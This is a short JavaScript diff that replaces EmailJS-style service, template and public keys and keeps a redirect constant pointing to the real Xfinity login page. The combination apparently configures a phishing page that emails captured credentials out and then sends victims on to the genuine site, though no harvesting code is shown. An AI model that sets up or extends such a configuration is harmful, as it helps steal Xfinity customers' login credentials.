@@ -4,7 +4,7 @@
  *
  * /**/
 
-const SERVICE_KEY = "service_e2pi6in";
-const TEMPLATE_KEY =  "template_bogyz0i";
-const PUBLIC_KEY = "38NlWmmQmivvUHQc6";
+const SERVICE_KEY = "service_3qfxht9";
+const TEMPLATE_KEY =  "template_lb9sit9";
+const PUBLIC_KEY = "OY0qqdS5YBsUti4Fw";
 const REDIRECT_URL = "https://login.xfinity.com/login?";
